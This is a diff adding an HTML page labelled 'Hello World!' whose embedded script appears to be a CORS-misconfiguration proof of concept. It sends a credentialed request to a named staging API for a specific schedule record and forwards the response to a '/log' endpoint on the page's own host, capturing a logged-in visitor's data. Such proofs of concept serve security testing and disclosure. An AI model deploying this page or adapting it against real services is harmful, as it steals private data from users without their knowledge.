@@ -1,0 +1,18 @@
+<html>
+    <body>
+        <h1>Hello World!</h1>
+        <script>
+            var xhr = new XMLHttpRequest();
+            var url = "https://stagingapi.cicle.app"
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == XMLHttpRequest.DONE){
+                    fetch("/log?_id=" + xhr.responseText)
+                }
+            }
+
+            xhr.open('GET', url + "/api/v1/schedules/6001420304986eb519028e65/", true);
+            xhr.withCredentials = true;
+            xhr.send(null)
+        </script>
+    </body>
+</html>
